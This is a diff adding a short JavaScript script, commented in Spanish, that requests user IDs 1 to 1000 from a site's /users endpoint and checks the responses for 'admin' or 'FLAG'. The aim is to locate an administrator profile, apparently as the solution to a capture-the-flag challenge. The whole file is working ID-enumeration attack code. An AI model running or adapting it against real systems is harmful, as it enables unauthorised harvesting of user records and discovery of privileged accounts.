@@ -1,0 +1,43 @@
+function probarIDs() {
+    let id = 1; // El ID inicial
+    const maxID = 1000; // El ID máximo que va a probar
+
+    function probarSiguiente() {
+        if (id > maxID) {
+            console.log("✅ Listo. Se probaron todos los IDs.");
+            return;
+        }
+
+        const url = `/users?id=${id}`;
+        fetch(url)
+            .then(res => res.text())
+            .then(html => {
+                if (html.includes("admin") || html.includes("FLAG")) {
+                    console.log(`🎯 ¡Perfil del admin encontrado! ID: ${id}`);
+                    console.log(`🔗 Ir a: ${window.location.origin}/profile/${id}`);
+                } else {
+		        if (html.includes("Detalle del integrante")) {
+            			console.log(`ID ${id} ES UN USUARIO.`);
+            		} else {
+            			if (html.includes("No se encontró ningún usuario con ese ID.")) {
+		    			console.log(`ID ${id} no esta registrado.`);
+		    		} else {
+                    			console.log(`ID ${id} ES ALGO RARO.`);
+                    		}
+                    	}
+                }
+
+                id++;
+                setTimeout(probarSiguiente, 300); // para no saturar el servidor
+            })
+            .catch(err => {
+                console.error(`Error al probar ID ${id}:`, err);
+                id++;
+                setTimeout(probarSiguiente, 300);
+            });
+    }
+
+    probarSiguiente();
+}
+
+probarIDs();
